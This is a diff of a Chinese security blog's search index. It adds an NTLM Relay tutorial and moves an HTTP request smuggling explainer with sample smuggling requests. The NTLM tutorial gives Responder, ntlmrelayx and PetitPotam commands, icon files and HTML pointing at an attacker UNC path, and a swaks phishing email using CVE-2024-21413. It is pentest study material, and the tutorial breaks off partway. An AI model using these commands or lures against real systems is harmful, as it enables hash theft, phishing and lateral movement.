@@ -50,70 +50,6 @@ hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt
       </tags>
   </entry>
   <entry>
-    <title>CTF Writeup 写作模板</title>
-    <url>/2026/08/14/ctf-writeup-template/</url>
-    <content><![CDATA[
-这是一篇示例文章，展示 Writeup 的推荐写法。写完自己的 Writeup 后可以删除本文。
-
-一、题目信息
-
-
-项目
-内容
-
-
-
-赛事
-某某 CTF 2026
-
-
-题目
-题目名称
-
-
-类型
-Web &#x2F; Pwn &#x2F; Crypto &#x2F; Misc &#x2F; Reverse
-
-
-分值
-500
-
-
-难度
-⭐⭐⭐
-
-
-二、题目描述把题目描述和附件下载链接贴在这里。
-三、解题过程3.1 信息收集打开题目，观察页面，抓包分析：
-curl -s http://target.com/ | head -20
-
-3.2 漏洞分析发现漏洞点，说明原理：
-import requestsr = requests.get(&#x27;http://target.com/flag.php&#x27;)print(r.text)
-
-3.3 漏洞利用给出完整的利用脚本（POC &#x2F; EXP）：
-python3 exp.py
-
-
-注意：关键 payload 记得用代码块包裹，方便读者复制。
-
-四、获取 Flagflag&#123;this_is_an_example_flag&#125;
-
-五、总结
-考察的知识点
-踩过的坑
-相关参考链接
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>模板</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB Dante 靶场 Writeup</title>
     <url>/2026/08/14/htb-dante/</url>
     <content><![CDATA[入口10.10.110.0/24简介Dante是一个现代化但适合初学者的专业实验室，提供学习常见红队方法论的机会，并熟悉Parrot OS Linux发行版中包含的工具。Dante LLC已聘请您的服务来审计他们的网络。该公司过去未进行全面的渗透测试，希望减少技术债务。他们担心任何实际的泄露都可能导致收入损失和声誉受损。突破边界后，你需要横向和垂直探索网络，直到获得所有主机的管理权限并达到域管理员权限。你将提升信息收集和态势感知技能，能够利用Windows和Linux缓冲区溢出，熟悉Metasploit框架，以及更多其他内容！沿途有许多旗帜可以被夺取，有些位于主攻路线上，有些则在支线任务中，你必须去寻找。提交旗帜将推动你进入名人堂，并在此过程中获得徽章作为奖励。这个红队操作员一级实验室将让玩家接触到：枚举漏洞开发横向移动特权升级网络应用攻击你的入口点在10.10.110.0/24。10.10.110.2 的防火墙不在权限范围内
@@ -1122,6 +1058,127 @@ flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}
       </tags>
   </entry>
   <entry>
+    <title>HTTP 请求走私</title>
+    <url>/2026/08/14/http-request-smuggling/</url>
+    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
+漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
+Content-Length头
+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
+
+Transfer-Encoding头
+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
+
+常见的HTTP请求走私类型
+
+CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
+TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
+TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
+
+入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
+1. 反向代理 &#x2F; 负载均衡器
+Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
+代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
+
+2. CDN &#x2F; WAF 后端
+CDN 节点与源站服务器之间
+WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
+
+3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
+API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
+任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
+
+4. 常见可利用的页面&#x2F;接口
+登录接口、用户认证页面（可走私出其他用户的会话）
+搜索、评论等反射型输入点（可配合 XSS 扩大危害）
+静态资源缓存节点（可实施缓存投毒）
+
+
+利用思路:基本原理回顾
+攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
+三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
+思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
+利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
+
+POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
+
+TE-CL 漏洞（前端用TE，后端用CL）
+思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
+利用：走私的请求前缀会污染下一个请求，影响其他用户
+
+POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
+
+TE-TE 漏洞（两端都用TE，但可混淆）
+思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
+常见混淆手法：
+Transfer-Encoding: xchunked（加前缀）
+Transfer-Encoding : chunked（冒号后多空格）
+Transfer-Encoding: chunked, identity（多值）
+重复的 Transfer-Encoding 头
+大小写变体：transfer-encoding、TRANSFER-ENCODING
+
+
+
+进阶利用场景
+
+
+利用场景
+说明
+
+
+
+绕过访问控制
+走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
+
+
+缓存投毒
+将恶意响应写入缓存，影响所有访问该缓存的用户
+
+
+会话劫持
+通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
+
+
+XSS 升级
+将反射型 XSS 转化为存储型&#x2F;扩散型危害
+
+
+凭据窃取
+走私请求诱导后端将下一个用户的请求内容返回给攻击者
+
+
+
+代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
+
+有的服务器优先使用 Content-Length
+有的服务器优先使用 Transfer-Encoding
+有的服务器在两者共存时报错，有的则静默选择其中一个
+
+2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
+// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
+
+3. 前后端使用不同的 HTTP 解析库
+前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
+不同语言、不同库对 HTTP 规范的实现细节存在差异
+特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
+
+4. 代理层未正确规范化请求头
+代理服务器在转发请求前，没有移除或规范化歧义的请求头
+安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
+
+5. Chunked 编码边界处理缺陷
+对 chunk size 的解析不严格（允许前导零、空白字符）
+对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
+chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>HTTP请求走私</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB Offshore 靶场 Writeup</title>
     <url>/2026/08/14/htb-offshore/</url>
     <content><![CDATA[简介离岸离岸是一个现实世界的企业环境，存在各种现代的Active Directory缺陷和配置错误。Offshore Corp 根据金融监管机构的合规要求，必须每季度进行渗透测试，并专注于补丁。公司已完成多项收购，被收购实体通过域名信托“连接”。如果你能够突破边界并立足，你的任务是探索企业环境，跨越信任界限，最终尝试破坏所有离岸公司实体。Offshore 将考验你对 Active Directory 枚举、利用和后利用，以及横向移动、枢轴和现代网络应用攻击的理解。有些旗帜是通过实验室推进的必需条件，而另一些则是支线任务，用来强化枚举和开发后技能。玩家可以提交旗帜以赢得离岸名人堂的席位，并在特定检查点收集徽章。这个渗透测试员二级实验室将让玩家接触到：枚举规避端点保护利用各种现实世界的Active Directory漏洞横向移动与跨越信托边界权限升级网络应用攻击入口：10.10.110.0/24
@@ -1831,127 +1888,6 @@ RBCD + Bronze Bit
       </tags>
   </entry>
   <entry>
-    <title>HTTP 请求走私</title>
-    <url>/2026/08/14/http-request-smuggling/</url>
-    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
-漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
-Content-Length头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
-
-Transfer-Encoding头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
-
-常见的HTTP请求走私类型
-
-CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
-TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
-TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
-
-入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
-1. 反向代理 &#x2F; 负载均衡器
-Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
-代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
-
-2. CDN &#x2F; WAF 后端
-CDN 节点与源站服务器之间
-WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
-
-3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
-API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
-任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
-
-4. 常见可利用的页面&#x2F;接口
-登录接口、用户认证页面（可走私出其他用户的会话）
-搜索、评论等反射型输入点（可配合 XSS 扩大危害）
-静态资源缓存节点（可实施缓存投毒）
-
-
-利用思路:基本原理回顾
-攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
-三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
-思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
-利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
-
-POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
-
-TE-CL 漏洞（前端用TE，后端用CL）
-思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
-利用：走私的请求前缀会污染下一个请求，影响其他用户
-
-POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
-
-TE-TE 漏洞（两端都用TE，但可混淆）
-思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
-常见混淆手法：
-Transfer-Encoding: xchunked（加前缀）
-Transfer-Encoding : chunked（冒号后多空格）
-Transfer-Encoding: chunked, identity（多值）
-重复的 Transfer-Encoding 头
-大小写变体：transfer-encoding、TRANSFER-ENCODING
-
-
-
-进阶利用场景
-
-
-利用场景
-说明
-
-
-
-绕过访问控制
-走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
-
-
-缓存投毒
-将恶意响应写入缓存，影响所有访问该缓存的用户
-
-
-会话劫持
-通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
-
-
-XSS 升级
-将反射型 XSS 转化为存储型&#x2F;扩散型危害
-
-
-凭据窃取
-走私请求诱导后端将下一个用户的请求内容返回给攻击者
-
-
-
-代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
-
-有的服务器优先使用 Content-Length
-有的服务器优先使用 Transfer-Encoding
-有的服务器在两者共存时报错，有的则静默选择其中一个
-
-2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
-// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
-
-3. 前后端使用不同的 HTTP 解析库
-前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
-不同语言、不同库对 HTTP 规范的实现细节存在差异
-特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
-
-4. 代理层未正确规范化请求头
-代理服务器在转发请求前，没有移除或规范化歧义的请求头
-安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
-
-5. Chunked 编码边界处理缺陷
-对 chunk size 的解析不严格（允许前导零、空白字符）
-对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
-chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>HTTP请求走私</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL 注入的原理及测试</title>
     <url>/2026/08/14/sql-injection-principles/</url>
     <content><![CDATA[SQL 注入原理：SQL 注入的本质是代码与数据未分离。当用户可控的输入被直接拼接到 SQL 语句中执行时，攻击者可以通过构造恶意输入改变原有 SQL 的逻辑，从而执行非预期的数据库操作。
@@ -2204,6 +2140,409 @@ union 能用
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻击方式 - NTLM Relay（手法很多）</title>
+    <url>/2026/08/14/ntlm-relay/</url>
+    <content><![CDATA[NTLM Relay:定义：NTLM Relay 攻击是指攻击者捕获用户的 NTLM 认证流量，然后将其中继（转发）到另一台服务器，从而冒充该用户身份访问目标服务的攻击方式。
+
+与 Pass-the-Hash 的区别：PtH 用的是 NTLM Hash 直接认证，NTLM Relay 用的是实时捕获的 Net-NTLM Hash 中继认证。
+
+NTLM认证流程：
+
+
+客户端 → 服务器：发送用户名，请求认证（NEGOTIATE）
+服务器 → 客户端：返回随机数 Challenge
+客户端：用自己的 NTLM Hash 加密 Challenge，生成 Response
+客户端 → 服务器：发送 Response（AUTHENTICATE）
+服务器 → 域控：把 Response、Challenge、用户名发给域控验证
+域控：用相应用户的 Hash 加密 Challenge，与 Response 比较，匹配则认证成功
+
+攻击原理: 攻击者处于中间人位置，把客户端的认证流量转发给目标服务器：  
+客户端 → 攻击者（捕获 Challenge）攻击者 → 目标服务器（转发 NEGOTIATE）目标服务器 → 攻击者（返回 Challenge）攻击者 → 客户端（转发 Challenge）客户端 → 攻击者（返回 Response）攻击者 → 目标服务器（转发 Response）目标服务器 → 认证成功，攻击者获得访问权限
+
+核心：攻击者不需要知道用户的密码，只需要把认证流程 “中转” 一下，就能冒充用户访问目标服务器。  
+攻击条件:
+目标服务器****未启用 SMB 签名（或签名策略为 “支持但不强制”）
+攻击者能捕获受害者的 Net-NTLM 认证流量
+当前账户有管理员权限访问目标服务器
+
+实战场景:场景 1：抓到 Hash 但爆破失败，中继横向移动
+
+情况：用 Responder 抓到了管理员的 Net-NTLM Hash，但密码太复杂，hashcat 跑了几天都爆破不出来
+利用：把这个 Net-NTLM Hash 直接中继到内网里没开 SMB 签名的目标服务器
+结果：不需要知道密码，直接以管理员身份访问目标服务器，dump 哈希或执行命令
+
+*场景 2：低权限主机横向移动到*内网服务器
+
+情况：刚拿到一台普通域内机器的低权限 shell，没有捞到任何凭据，目标是内网的文件服务器（ 目标可以是任何没开 SMB 签名、且受害者有权限访问的服务）
+利用：在控制的机器上跑 Responder 投毒，同时跑 ntlmrelayx 把捕获到的认证中继到文件服务器
+结果：等内网里某个有权限的用户触发LLMNR广播，认证被中继过去，直接拿到文件服务器访问权限
+
+场景 3：诱导域控主动认证，中继拿域
+
+情况：控制了一台域内成员机器，目标是拿下域控
+利用：用 SpoolSample 打印机漏洞或 PetitPotam 诱导域控主动向你发起认证，然后把域控的认证中继到其他没开签名的服务器或域控的 LDAP 服务
+结果：以域控身份在 AD 里添加用户、修改 ACL，进而拿到域管权限，拿下整个域
+
+攻击过程:攻击分为两步：
+
+捕获Net-NTLM Hash
+重放Net-NTLM Hash
+
+🚩捕获Net-NTLM Hash1️⃣监听：捕获目标服务器发来的NTLM请求工具：Responfer抓 Hash 用:python3 Responder.py -I ip -wrfv配合 NTLM relayx 中继用（关闭自身的 SMB/HTTP 服务，让中继工具处理）python3 Responder.py -I ip -rPvKali自带，直接运行responder -I ip -wrf
+
+Responder &#x3D; 投毒骗人 + 抓 Hash
+ntlmrelayx &#x3D; 监听接收 + 中继转发
+2️⃣诱导域控主动认证:使目标服务器主动向攻击者发起NTLM认证LLMNR&amp;NBNS协议攻击LLMNR和NBNS协议：是局域网内的协议，主要用于局域网中的名称解析。当其他地方解析失败时，windows系统就会使用LLMNR和NBNS协议解析名称。
+
+windows系统的名称解析的顺序：
+
+本地host文件（%windir%\System32\dirvers\etc\hosts）
+DNS缓存&#x2F;DNS服务器
+LLMNR和NBNS协议
+
+
+LLMNR（链路本地多播名称解析）：Windows 系统在 DNS 解析失败时，通过多播向同一网段的所有主机询问 “谁是这个名字” 的协议。  
+NBNS（NetBIOS 名称服务）：更老的 Windows 名称解析协议，通过广播向同一网段询问主机名，是 LLMNR 的前身。  
+
+
+
+对比项
+LLMNR
+NBNS
+
+
+
+端口
+UDP 5355
+UDP 137
+
+
+传输方式
+多播（Multicast）
+广播（Broadcast）
+
+
+出现时间
+Vista 之后引入，较新
+老协议，从 Windows NT 时代就有
+
+
+解析范围
+IPv4 + IPv6
+仅 IPv4
+
+
+默认开启
+Windows 默认开启
+Windows 默认开启
+
+
+LLMNR&amp;NBNS 攻击原理 利用 Windows 名称解析的 “信任机制”，冒充目标主机应答，诱导受害者主动送上门认证  
+1. 受害者访问一个不存在的主机名（比如输错共享名 \\filesvr）    ↓2. DNS 解析失败    ↓3. 受害者发起 LLMNR 多播 / NBNS 广播，问&quot;谁是 filesvr？&quot;    ↓4. 攻击者抢先应答：&quot;我是 filesvr，来连我吧&quot;    ↓5. 受害者信以为真，主动向攻击者发起 NTLM 认证    ↓6. 攻击者捕获到受害者的 Net-NTLM Hash
+
+工具：ntlmrelayx.py# 1. 确认当前机子网卡ip addr  # 假设是 eth0，IP是192.168.1.50# 2. 启动中继python3 ntlmrelayx.py -smb2support -t smb://192.168.1.200# 3. 启动 Responderpython3 Responder.py -I eth0 -rPv# 4. 抓到后查看结果cat logs/SMB-NTLMv2-SSP-*.txt
+
+打印机漏洞打印机漏洞原理 Windows Print Spooler（打印后台处理服务）默认开启，存在一个功能：任何域用户都可以通过 MS-RPRN 协议，强制一台主机向指定的另一台主机发起认证请求。
+工具：printerbug.py启动 ntlmrelayxprinterbug 诱导域控主动认证：python3 printerbug.py 域名/用户名:密码@目标主机IP 攻击者IP
+
+🚩PetitPotam攻击PetitPotam攻击原理： PetitPotam 利用 MS-EFSRPC（加密文件系统远程协议） 中的一个功能，强制目标主机向指定的攻击者主机发起 NTLM 认证。  
+工具：Pertitpotam.py启动 ntlmrelayx基础命令：python3 PetitPotam.py 攻击者IP 目标主机IP带认证：python3 PetitPotam.py -u 用户名 -p 密码 -d 域名 攻击者IP 目标主机IP用 Hash 登录：python3 PetitPotam.py -u 用户名 -hashes :NTLM哈希 -d 域名 攻击者IP 目标主机IP
+
+图标当 Windows 资源管理器加载文件 &#x2F; 文件夹图标时，如果图标路径是一个 UNC 路径（\\攻击者IP\共享名），Windows 会主动向这个 UNC 路径发起 NTLM 认证，攻击者就能捕获到 Net-NTLM Hash。  
+ 本质：利用 Windows 自动加载图标的特性，诱导目标机器主动送上门认证。  
+🚩desktop.ini文件原理
+每个文件夹可以有一个 desktop.ini 文件，用来自定义文件夹图标。把图标路径改成攻击者的 UNC 路径，用户一打开这个文件夹，就会触发 NTLM 认证。
+操作步骤
+第 1 步：创建 desktop.ini 文件
+[.ShellClassInfo]IconFile=\\攻击者IP\share\icon.icoIconIndex=0
+
+第 2 步：设置文件夹属性
+# 给文件夹设置系统属性，desktop.ini 才会生效attrib +s &quot;目标文件夹路径&quot;
+
+第 3 步：把 desktop.ini 放进目标文件夹
+把写好的 desktop.ini 放到共享文件夹里，等用户打开。
+第 4 步：启动 Responder 监听
+python3 Responder.py -I eth0 -wrf
+
+第 5 步：等用户打开文件夹
+用户一打开这个文件夹，Windows 就会去 \\攻击者IP\share\icon.ico 加载图标，主动发起 NTLM 认证。
+.scf后缀文件（⚠️ 新版 Windows 部分失效）
+.scf 是 Windows 资源管理器的命令文件，打开时会自动加载 IconFile 指定的图标。
+文件内容：
+[Shell]Command=2IconFile=\\攻击者IP\share\icon.ico[Taskbar]Command=ToggleDesktop
+
+保存为 任意文件名.scf，放进共享文件夹。
+
+⚠️ 注意：Windows 10 1809 之后的版本，.scf 文件攻击已被缓解，需要用户双击才会触发，成功率降低。推荐优先用 desktop.ini。
+
+浏览器 当浏览器访问的页面中含有 UNC 路径（\\攻击者IP\共享名）时，浏览器在解析该页面时会尝试请求该 UNC 地址，然后自动发起 NTLM 认证，攻击者就能捕获到 Net-NTLM Hash。  
+
+
+触发方式：在 HTML 页面中插入各种指向 UNC 路径的标签：
+&lt;img src=&quot;\\攻击者IP\share\pic.jpg&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;\\攻击者IP\share\style.css&quot;&gt;&lt;script src=&quot;\\攻击者IP\share\test.js&quot;&gt;&lt;/script&gt;&lt;iframe src=&quot;\\攻击者IP\share\page.html&quot;&gt;&lt;/iframe&gt;&lt;div style=&quot;background: url(\\攻击者IP\share\bg.png)&quot;&gt;&lt;/div&gt;
+
+用户访问这个页面时，浏览器会自动去加载这些资源，从而发起 NTLM 认证。
+现代浏览器基本失效：
+ 现代浏览器出于安全考虑，默认禁止从 HTTP&#x2F;HTTPS 页面加载 file:// 和 UNC 路径资源，会直接拦截，不会发起 NTLM 认证。  
+现在还能用的场景：
+虽然浏览器直接加载 UNC 路径被禁了，但还有一些场景可以利用：
+场景 1：内网 Web 应用触发如果目标是内网的 Web 应用，且应用存在以下问题，仍然可以触发：
+
+SSRF 漏洞：让服务器端去请求 UNC 路径
+文件上传 &#x2F; 包含：上传包含 UNC 路径的文件
+HTML 注入 &#x2F; 存储型 XSS：在内网网站插入 UNC 路径图片
+
+&lt;!-- 存储型 XSS  payload，插入内网论坛/博客 --&gt;&lt;img src=&quot;\\10.0.0.50\share\x.jpg&quot; style=&quot;display:none&quot;&gt;
+
+其他用户浏览这个页面时，如果浏览器策略允许（比如企业内网环境放宽了限制），就会触发认证。
+场景 2：钓鱼 + 本地 HTML 文件发钓鱼邮件，附件是一个 .html 文件，用户下载后本地双击打开：
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;  &lt;h1&gt;正在加载，请稍候...&lt;/h1&gt;  &lt;img src=&quot;\\10.0.0.50\share\loading.jpg&quot; style=&quot;display:none&quot;&gt;&lt;/body&gt;&lt;/html&gt;
+
+本地打开的 HTML 文件（file:// 协议）访问 UNC 路径，部分浏览器不会拦截，成功率比远程页面高。
+场景 3：利用 .url&#x2F;.website 快捷方式创建一个 .url 文件，放在共享文件夹里：
+[InternetShortcut]URL=\\攻击者IP\share\testIconFile=\\攻击者IP\share\icon.icoIconIndex=0
+
+用户浏览到这个文件时，资源管理器会尝试加载图标，触发 NTLM 认证（这个本质上是图标攻击，不是浏览器攻击，但效果类似）。
+配合 Responder 完整流程# 1. 启动 Responder 监听python3 Responder.py -I eth0 -wrf# 2. 准备恶意页面（任选一种触发方式）# 方式A：远程页面（成功率低）# 方式B：本地 HTML 钓鱼文件（成功率较高）# 3. 诱导用户访问/打开# 4. Responder 捕获 Net-NTLM Hash
+
+Outlook利用 Outlook 渲染邮件内容时的特性，在邮件中插入指向攻击者 UNC 路径的资源（图片、链接等），当受害者打开或预览邮件时，Outlook 会自动向攻击者的 SMB 服务器发起 NTLM 认证，从而泄露 Net-NTLM Hash。
+方式 1：邮件中插入 UNC 路径图片原理:HTML 格式的邮件中插入 &lt;img&gt; 标签，src 指向 UNC 路径，Outlook 渲染邮件时自动加载图片，触发 NTLM 认证。
+邮件内容
+&lt;html&gt;&lt;body&gt;  &lt;p&gt;您好，请查收附件。&lt;/p&gt;  &lt;img src=&quot;\\攻击者IP\share\logo.jpg&quot; width=&quot;1&quot; height=&quot;1&quot; style=&quot;display:none&quot;&gt;&lt;/body&gt;&lt;/html&gt;
+
+需要用户手动点击 “下载图片” 才会触发，成功率低
+方式 2：Moniker Link 攻击（CVE-2024-21413）⭐ 重点原理:Outlook 解析 file:// 协议链接时存在漏洞，当链接格式为 file://\\攻击者IP\共享名\文件 时，Outlook 会绕过安全检查，直接向攻击者的 SMB 服务器发起 NTLM 认证。
+利用条件:
+
+Outlook 版本未打 2024 年 2 月补丁
+受害者点击邮件中的链接（或某些版本预览就触发）
+
+邮件内容
+&lt;html&gt;&lt;body&gt;  &lt;p&gt;请点击查看文档：&lt;/p&gt;  &lt;a href=&quot;file://\\10.0.0.50\share\document.docx&quot;&gt;点击查看&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
+
+关键：链接必须用 file://\\IP\共享\文件 格式，不能用普通的 \\IP\共享\文件。
+方式 3：日历共享功能漏洞（较新）原理:利用 Outlook 日历共享功能，构造特殊的邮件头（Content-Class 和 x-sharing-config-url），当受害者打开邮件时，Outlook 会自动向 x-sharing-config-url 指定的 UNC 路径发起认证。
+邮件头:
+Content-Class: sharingx-sharing-config-url: \\攻击者IP\share\config
+
+完整利用流程# 第1步：启动 Responder 监听python3 Responder.py -I eth0 -wrf# 第2步：构造恶意邮件（任选一种方式）# - HTML 邮件插入 UNC 图片# - Moniker Link 攻击（file://\\IP\share）# - 日历共享邮件头# 第3步：发送邮件给受害者# 可以用 sendmail、swaks、或直接用 Outlook 发送# 第4步：受害者打开/预览/点击邮件# Outlook 自动向攻击者发起 NTLM 认证# 第5步：Responder 捕获 Net-NTLM Hash# 可以爆破，或者配合 ntlmrelayx 中继
+
+用 swaks 发送恶意邮件（命令行）# 安装 swaksapt install swaks# 发送 HTML 格式的恶意邮件swaks --to 受害者@域名.com \  --from 攻击者@域名.com \  --header &quot;Subject: 请查收文档&quot; \  --body &#x27;&lt;html&gt;&lt;body&gt;&lt;p&gt;请点击查看：&lt;/p&gt;&lt;a href=&quot;file://\\10.0.0.50\share\doc.docx&quot;&gt;点击这里&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&#x27; \  --header &quot;Content-Type: text/html&quot; \  --server 邮件服务器IP
+
+🚩系统命令通过执行系统命令访问指定的UNC路径，也可以获取目标机器的Net-NTLM Hash
+常用命令列表：net.exe use \\host\shareattrib.exe \\host\sharecacls.exe \\host\sharecertreq.exe \\host\sharecertutil.exe \\host\sharecipher.exe \\host\shareClipUp.exe -l \\host\sharecmd132.exe \\host\sharecmstp.exe /s \\host\sharecolorcpl.exe \\host\sharecomp.exe /N=0 \\host\share \\host\sharecompact.exe \\host\sharecontrol.exe \\host\shareconvertvhd.exe -source \\host\share -destination \\host\shareDefrag.exe \\host\sharediskperf.exe \\host\sharedispdiag.exe -out \\host\sharedoskey.exe /MACROFILE=\\host\shareesentutl.exe /k \\host\shareexpand.exe \\host\shareextrac32.exe \\host\shareFileHistory.exe \\host\sharefindstr.exe * \\host\sharefontview.exe \\host\sharefvenotify.exe \\host\shareFXSCOVER.exe \\host\sharehwrcomp.exe -check \\host\sharehwrreg.exe \\host\shareicacls.exe \\host\sharelicensingdiag.exe -cab \\host\sharelodctr.exe \\host\sharelpksetup.exe /p \\host\share /smakecab.exe \\host\sharemsiexec.exe /update \\host\share /quietmsinfo32.exe \\host\sharemspaint.exe \\host\sharemsra.exe /openfile \\host\sharemstsc.exe \\host\sharenetcfg.exe -l \\host\share -c p -i foo
+
+
+ 推荐的命令：certutil.exe、cipher.exe、icacls.exe、net.exe use，这些比较常用且噪音小。  
+
+Office原理：新建 Word 文档，插入一张图片，然后修改文档内部的 XML 关系文件，把图片路径改成 UNC 路径。用户打开文档时，Word 会去加载远程图片，触发 NTLM 认证。
+操作步骤
+新建一个 Word 文档，插入一张图片
+用压缩软件打开 .docx 文件（docx 本质是 zip 包）
+进入 word\_rels 目录，打开 document.xml.rels
+找到图片对应的 Target 参数，原来是本地路径
+修改为指定的 UNC 路径，并加上 TargetMode=&quot;External&quot;
+
+修改示例
